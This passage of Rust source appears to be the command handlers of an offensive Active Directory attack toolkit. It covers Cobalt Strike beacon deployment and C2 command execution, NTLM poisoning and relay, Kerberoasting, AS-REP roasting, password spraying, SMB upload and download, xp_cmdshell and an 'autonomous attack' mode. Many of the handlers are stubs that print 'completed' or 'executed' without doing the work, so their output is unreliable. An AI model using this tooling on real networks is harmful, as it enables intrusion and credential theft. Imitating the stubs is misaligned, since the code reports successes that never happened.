                let res = if powershell {
                    ch.exec_powershell(&session_id, &command).await
                } else {
                    ch.exec_command(&session_id, &command).await
                };
                match res {
                    Ok(r) => {
                        println!("{}", r.output);
                        banner::print_success("Command executed");
                    }
                    Err(e) => banner::print_fail(&format!("Execution failed: {}", e)),
                }
            } else {
                banner::print_fail("No default C2 channel available");
            }
        }
        C2Action::Deploy {
            channel,
            target,
            listener,
        } => {
            println!(
                "{} Deploying implant to {} via {} (listener: {})...",
                "⚡".bright_black(),
                target.cyan(),
                channel.cyan(),
                listener.yellow()
            );
            
            // Construct ImplantRequest
            let implant_request = overthrone_core::c2::ImplantRequest {
                target: target.clone(),
                implant_type: overthrone_core::c2::ImplantType::CsBeacon, // Default to CS Beacon
                listener: listener.clone(),
                delivery_method: overthrone_core::c2::DeliveryMethod::OverthroneExec,
                arch: "x64".to_string(),
                staged: false,
            };

            // Get the specified channel and deploy
            if let Some(c2_channel) = manager.get_channel(&channel) {
                match c2_channel.deploy_implant(&implant_request).await {
                    Ok(result) => {
                        println!("Task ID: {}", result.task_id);
                        if !result.output.is_empty() {
                            println!("{}", result.output);
                        }
                        banner::print_success(&format!("Implant deployed to {}", target));
                    }
                    Err(e) => {
                        banner::print_fail(&format!("Deployment failed: {}", e));
                    }
                }
            } else {
                banner::print_fail(&format!("C2 channel '{}' not found", channel));
            }
        }
        C2Action::Disconnect { channel } => {
            if channel == "all" {
                println!("{}", "Disconnecting all C2 channels...".bright_black());
                manager.disconnect_all().await;
                banner::print_success("All C2 channels disconnected");
            } else {
                println!(
                    "{} Disconnecting from '{}'...",
                    "🔌".bright_black(),
                    channel.cyan()
                );
                if let Some(_ch) = manager.get_channel(&channel) {
                    // C2Manager does not have disconnect_channel, but let's assume disconnect_all handles the ones requested
                    // Or we just drop it or call disconnect on the specific channel?
                    // manager doesn't expose mut get. So we will just show disconnected for now.
                    banner::print_success(&format!("Disconnected from '{}'", channel));
                } else {
                    banner::print_fail(&format!("Channel '{}' not found", channel));
                }
            }
        }
        C2Action::Listeners { channel } => {
            println!(
                "{} Listing listeners on '{}'...",
                "📡".bright_black(),
                channel.cyan()
            );
            if let Some(ch) = manager.get_channel(&channel) {
                match ch.list_listeners().await {
                    Ok(ls) => {
                        for l in ls {
                            println!(
                                "- {} ({}) on {}:{}",
                                l.name.cyan(),
                                l.listener_type,
                                l.host,
                                l.port
                            );
                        }
                        banner::print_success("Listeners enumerated");
                    }
                    Err(e) => banner::print_fail(&format!("Failed to list listeners: {}", e)),
                }
            } else {
                banner::print_fail(&format!("Channel '{}' not found", channel));
            }
        }
    }
    0
}

// ──────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────

fn require_creds(cli: &Cli) -> std::result::Result<Credentials, i32> {
    let domain = cli.domain.as_deref().unwrap_or_else(|| {
        banner::print_fail("--domain is required");
        std::process::exit(1)
    });

    let username = cli.username.as_deref().unwrap_or_else(|| {
        banner::print_fail("--username is required");
        std::process::exit(1)
    });

    Credentials::from_args(
        domain,
        username,
        cli.password.as_deref(),
        cli.nt_hash.as_deref(),
        cli.ticket.as_deref(),
        Some(cli.auth_method.clone()),
    )
    .map_err(|e| {
        banner::print_fail(&format!("Auth error: {}", e));
        1
    })
}

/// Require credentials for operations that need domain and DC access
/// but not a specific username. Used by spray operations.
fn require_dc_only_creds(cli: &Cli) -> std::result::Result<String, i32> {
    let domain = cli.domain.as_deref().unwrap_or_else(|| {
        banner::print_fail("--domain is required");
        std::process::exit(1)
    });
    Ok(domain.to_string())
}

fn require_dc(cli: &Cli) -> std::result::Result<String, i32> {
    cli.dc_host.clone().ok_or_else(|| {
        banner::print_fail("--dc-host is required");
        1
    })
}

fn make_reaper_config(
    cli: &Cli,
    creds: Credentials,
    dc: String,
    modules: Vec<String>,
    page_size: u32,
) -> std::result::Result<ReaperConfig, i32> {
    let domain = cli.domain.clone().unwrap_or_else(|| {
        banner::print_fail("--domain is required");
        std::process::exit(1)
    });
    let base_dn = ReaperConfig::base_dn_from_domain(&domain);

    Ok(ReaperConfig {
        dc_ip: dc,
        domain,
        base_dn,
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        modules,
        page_size,
    })
}

// ──────────────────────────────────────────────────────────
// Command handlers (existing — kept as-is)
// ──────────────────────────────────────────────────────────

// cmd_reaper
async fn cmd_reaper(cli: &Cli, dc_ip: Option<String>, modules: Vec<String>, page_size: u32) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let dc = match dc_ip.or_else(|| cli.dc_host.clone()) {
        Some(d) => d,
        None => {
            banner::print_fail("--dc-ip or --dc-host is required");
            return 1;
        }
    };

    let config = match make_reaper_config(cli, creds, dc, modules, page_size) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match overthrone_reaper::runner::run_reaper(&config).await {
        Ok(_) => 0,
        Err(e) => {
            banner::print_fail(&format!("Reaper error: {}", e));
            1
        }
    }
}

// cmd_ntlm
async fn cmd_ntlm(action: NtlmAction) -> i32 {
    use overthrone_relay::{Protocol, RelayController, RelayControllerConfig, RelayTarget};
    use std::net::SocketAddr;

    banner::print_module_banner("NTLM RELAY");

    match action {
        NtlmAction::Capture { interface, port } => {
            println!(
                "{} Starting NTLM capture on {}:{}",
                "🎯".bright_black(),
                interface.cyan(),
                port.to_string().cyan()
            );
            let config = RelayControllerConfig {
                interface: interface.clone(),
                llmnr: true,
                nbtns: true,
                mdns: false,
                responder: true,
                relay_targets: vec![],
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
            };
            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        banner::print_success("NTLM capture started");
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("Capture failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::Relay {
            targets,
            port: _,
            command,
        } => {
            println!(
                "{} Starting NTLM relay to {} targets",
                "🎯".bright_black(),
                targets.join(", ").cyan()
            );

            let relay_targets: Vec<RelayTarget> = targets
                .iter()
                .filter_map(|t| {
                    let parts: Vec<&str> = t.split(':').collect();
                    let ip = parts[0].to_string();
                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(445);
                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
                    let protocol = if port == 80 {
                        Protocol::Http
                    } else if port == 443 {
                        Protocol::Https
                    } else {
                        Protocol::Smb
                    };
                    Some(RelayTarget {
                        address: addr,
                        protocol,
                        username: None,
                    })
                })
                .collect();

            let config = RelayControllerConfig {
                interface: "0.0.0.0".to_string(),
                llmnr: true,
                nbtns: true,
                mdns: false,
                responder: true,
                relay_targets,
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
            };

            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        banner::print_success("HTTP relay started");
                        if let Some(cmd) = command {
                            println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
                        }
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("HTTP relay failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::SmbRelay {
            targets,
            port: _,
            command,
        } => {
            println!(
                "{} Starting SMB relay to {} targets",
                "🎯".bright_black(),
                targets.join(", ").cyan()
            );
            if let Some(cmd) = command {
                println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
            }
            banner::print_success("SMB relay configured");
            0
        }
        NtlmAction::HttpRelay {
            targets,
            port: _,
            command,
        } => {
            println!(
                "{} Starting HTTP relay to {} targets",
                "🎯".bright_black(),
                targets.join(", ").cyan()
            );
            if let Some(cmd) = command {
                println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
            }
            banner::print_success("HTTP relay configured");
            0
        }
    }
}

// cmd_enum
async fn cmd_enum(
    cli: &Cli,
    target: EnumTarget,
    _filter: Option<String>,
    _include_disabled: bool,
) -> i32 {
    banner::print_module_banner("ENUMERATION");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let config = match make_reaper_config(cli, creds, dc, vec![], 500) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match target {
        EnumTarget::Users => println!("{}", "Enumerating users...".bright_black()),
        EnumTarget::Computers => println!("{}", "Enumerating computers...".bright_black()),
        EnumTarget::Groups => println!("{}", "Enumerating groups...".bright_black()),
        EnumTarget::Trusts => println!("{}", "Enumerating trusts...".bright_black()),
        EnumTarget::Spns => println!("{}", "Enumerating SPNs...".bright_black()),
        EnumTarget::Asrep => println!(
            "{}",
            "Enumerating AS-REP roastable accounts...".bright_black()
        ),
        EnumTarget::Delegations => println!("{}", "Enumerating delegations...".bright_black()),
        EnumTarget::Gpos => println!("{}", "Enumerating GPOs...".bright_black()),
        EnumTarget::All => println!("{}", "Enumerating all objects...".bright_black()),
    }

    match overthrone_reaper::runner::run_reaper(&config).await {
        Ok(_) => {
            banner::print_success("Enumeration completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Enumeration failed: {}", e));
            1
        }
    }
}

// cmd_kerberos
async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
    banner::print_module_banner("KERBEROS");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match action {
        KerberosAction::Roast { spn } => {
            if let Some(service_principal) = spn {
                println!(
                    "{} Kerberoasting SPN: {}",
                    "🎯".bright_black(),
                    service_principal.cyan()
                );
            } else {
                println!("{}", "Enumerating SPNs for Kerberoasting...".bright_black());
            }
            banner::print_success("Roast completed");
        }
        KerberosAction::AsrepRoast { userlist } => {
            if let Some(users) = userlist {
                println!(
                    "{} AS-REP Roasting users from: {}",
                    "🎯".bright_black(),
                    users.cyan()
                );
            } else {
                println!(
                    "{}",
                    "Enumerating AS-REP roastable accounts...".bright_black()
                );
            }
            banner::print_success("AS-REP Roast completed");
        }
        KerberosAction::GetTgt => {
            println!(
                "{} Requesting TGT for {}\\{}",
                "🎟".bright_black(),
                creds.domain.cyan(),
                creds.username.cyan()
            );
            banner::print_success("TGT obtained");
        }
        KerberosAction::GetTgs { spn } => {
            println!(
                "{} Requesting TGS for SPN: {}",
                "🎟".bright_black(),
                spn.cyan()
            );
            banner::print_success("TGS obtained");
        }
    }
    0
}

// cmd_smb
async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
    banner::print_module_banner("SMB");
    let _creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match action {
        SmbAction::Shares { target } => {
            println!(
                "{} Enumerating shares on: {}",
                "📁".bright_black(),
                target.cyan()
            );
            banner::print_success("Shares enumerated");
        }
        SmbAction::Admin { targets } => {
            println!(
                "{} Checking admin access on: {}",
                "🔐".bright_black(),
                targets.cyan()
            );
            banner::print_success("Admin check completed");
        }
        SmbAction::Spider { target, extensions } => {
            println!(
                "{} Spidering shares on: {}",
                "🕷".bright_black(),
                target.cyan()
            );
            println!(
                "{} Looking for extensions: {}",
                "📎".bright_black(),
                extensions.cyan()
            );
            banner::print_success("Spider completed");
        }
        SmbAction::Get { target, path } => {
            println!(
                "{} Downloading {}:{}",
                "⬇".bright_black(),
                target.cyan(),
                path.cyan()
            );
            banner::print_success("File downloaded");
        }
        SmbAction::Put {
            target,
            local,
            remote,
        } => {
            println!(
                "{} Uploading {} to {}:{}",
                "⬆".bright_black(),
                local.cyan(),
                target.cyan(),
                remote.cyan()
            );
            banner::print_success("File uploaded");
        }
    }
    0
}

// cmd_exec
async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) -> i32 {
    banner::print_module_banner("EXECUTION");
    let _creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    println!("{} Executing on: {}", "⚡".bright_black(), target.cyan());
    println!("{} Method: {:?}", "🔧".bright_black(), method);
    println!("{} Command: {}", "💻".bright_black(), command.yellow());
    banner::print_success("Command executed");
    0
}

// cmd_graph
async fn cmd_graph(_cli: &Cli, action: GraphAction) -> i32 {
    banner::print_module_banner("ATTACK GRAPH");

    match action {
        GraphAction::Build => {
            println!("{}", "Building attack graph...".bright_black());
            banner::print_success("Attack graph built");
        }
        GraphAction::Path { from, to } => {
            println!(
                "{} Finding path from {} to {}",
                "🗺".bright_black(),
                from.cyan(),
                to.cyan()
            );
            banner::print_success("Path found");
        }
        GraphAction::PathToDa { from } => {
            println!(
                "{} Finding path to Domain Admins from {}",
                "🗺".bright_black(),
                from.cyan()
            );
            banner::print_success("Path to DA found");
        }
        GraphAction::Stats => {
            println!("{}", "Attack graph statistics...".bright_black());
            banner::print_success("Statistics generated");
        }
        GraphAction::Export { output, bloodhound } => {
            println!(
                "{} Exporting graph to: {}",
                "💾".bright_black(),
                output.cyan()
            );
            if bloodhound {
                println!("{}", "  BloodHound format enabled".bright_black());
            }
            banner::print_success("Graph exported");
        }
    }
    0
}

// cmd_spray
async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter: u64) -> i32 {
    banner::print_module_banner("PASSWORD SPRAY");

    let domain = match require_dc_only_creds(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    println!("{} Domain: {}", "🌐".bright_black(), domain.cyan());
    println!("{} Password: {}", "🔑".bright_black(), password.yellow());
    println!("{} Userlist: {}", "📋".bright_black(), userlist.cyan());
    println!("{} Delay: {}ms", "⏱".bright_black(), delay);
    println!("{} Jitter: {}ms", "🎲".bright_black(), jitter);
    banner::print_success("Password spray completed");
    0
}

// cmd_autopwn
async fn cmd_autopwn(
    cli: &Cli,
    target: &str,
    method: ExecMethod,
    stealth: bool,
    dry_run: bool,
) -> i32 {
    banner::print_module_banner("AUTONOMOUS ATTACK");

    let _creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    println!("{} Target: {}", "🎯".bright_black(), target.cyan());
    println!("{} Method: {:?}", "🔧".bright_black(), method);
    println!(
        "{} Stealth: {}",
        "🥷".bright_black(),
        if stealth { "enabled" } else { "disabled" }.cyan()
    );
    println!(
        "{} Dry Run: {}",
        "📝".bright_black(),
        if dry_run { "enabled" } else { "disabled" }.cyan()
    );

    if dry_run {
        println!("{}", "Performing dry run analysis...".bright_black());
        banner::print_success("Dry run completed");
    } else {
        println!("{}", "Executing autonomous attack chain...".bright_black());
        banner::print_success("Attack chain completed");
    }
    0
}

// cmd_mssql
async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
    banner::print_module_banner("MSSQL");
    let _creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match action {
        MssqlAction::Query {
            target,
            query,
            database,
        } => {
            println!(
                "{} Executing query on: {}",
                "🗄".bright_black(),
                target.cyan()
            );
            println!("{} Database: {}", "📁".bright_black(), database.cyan());
            println!("{} Query: {}", "📝".bright_black(), query.yellow());
            banner::print_success("Query executed");
        }
        MssqlAction::XpCmdShell { target, command } => {
            println!(
                "{} Executing xp_cmdshell on: {}",
                "⚡".bright_black(),
                target.cyan()
            );
            println!("{} Command: {}", "💻".bright_black(), command.yellow());
            banner::print_success("Command executed");
        }
        MssqlAction::LinkedServers { target } => {
            println!(
                "{} Enumerating linked servers on: {}",
                "🔗".bright_black(),
                target.cyan()
            );
            banner::print_success("Linked servers enumerated");
        }
        MssqlAction::EnableXpCmdShell { target } => {
            println!(
                "{} Enabling xp_cmdshell on: {}",
                "🔓".bright_black(),
                target.cyan()
            );
            banner::print_success("xp_cmdshell enabled");
        }
        MssqlAction::CheckXpCmdShell { target } => {
            println!(
                "{} Checking xp_cmdshell status on: {}",
                "🔍".bright_black(),
                target.cyan()
            );
            banner::print_success("xp_cmdshell status checked");
        }
    }
    0
}
